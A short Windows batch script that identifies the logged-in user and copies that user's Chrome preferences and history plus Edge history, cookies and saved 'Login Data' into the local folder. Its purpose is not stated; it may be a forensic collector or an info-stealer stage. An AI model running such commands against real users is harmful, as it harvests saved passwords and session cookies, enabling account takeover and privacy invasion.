
@echo off

:: Attempt to get current user name
for /f "TOKENS=1,2,*" %%a in ('tasklist /FI "IMAGENAME eq explorer.exe" /FO LIST /V') do if /i "%%a %%b"=="User Name:" set _currdomain_user=%%c
for /f "TOKENS=1,2 DELIMS=\" %%a in ("%_currdomain_user%") do set _currdomain=%%a & set _curruser=%%b

::Get Chrome preferences
copy "C:\Users\%_curruser%\AppData\Local\Google\Chrome\User Data\Default\Preferences" "Chrome_Preferences" /Y
copy "C:\Users\%_curruser%\AppData\Local\Google\Chrome\User Data\Default\History" "Chrome_History" /Y

::Get Edge
::copy "C:\Users\%_curruser%\AppData\Local\Microsoft\Edge\User Data\Default\Cache" "Edge_Cache" /Y
copy "C:\Users\%_curruser%\AppData\Local\Microsoft\Edge\User Data\Default\History" "Edge_History" /Y
copy "C:\Users\%_curruser%\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" "Edge_Cookies" /Y
copy "C:\Users\%_curruser%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "Edge_Login_Data" /Y
